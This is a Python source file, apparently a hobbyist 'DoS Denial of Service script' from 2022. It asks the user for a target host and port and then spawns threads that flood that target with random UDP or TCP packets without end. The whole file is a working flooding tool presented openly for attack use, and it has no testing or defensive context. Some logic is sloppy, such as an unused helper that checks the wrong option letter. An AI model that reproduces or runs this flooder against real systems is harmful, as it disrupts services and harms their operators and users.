#Author: Menesay
#2022
#Python 3 DoS Denial of Service script.

import signal
import socket
import random
import threading
import sys
from os import system, name

print("##########################################")
print("#  Python DoS Denial of Service script	 #")
print("#	    Author: Menesay	         #")
print("#                   2022                 #")
print("##########################################")



test = input()
if test == "n":
	exit(0)

ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP or TCP (u/t):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))

#UDP
def udp():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"UDP Sent!!!")
		except:
			s.close()
			print("[!] Error!!!")

#TCP
def tcp():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TCP Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'u':
		th = threading.Thread(target = udp)
		th.start()
	elif choice == "t":
		th = threading.Thread(target = tcp)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = udp)
			th.start()
		else:
			th = threading.Thread(target = tcp)
			th.start()


def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def exit():
	clear()
	sys.exit(130)

def exit_gracefully(signum, frame):

    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input("exit(y/n)?:"))
        if exitc == 'y':

            exit()

    except KeyboardInterrupt:
        exit()

    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':

    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
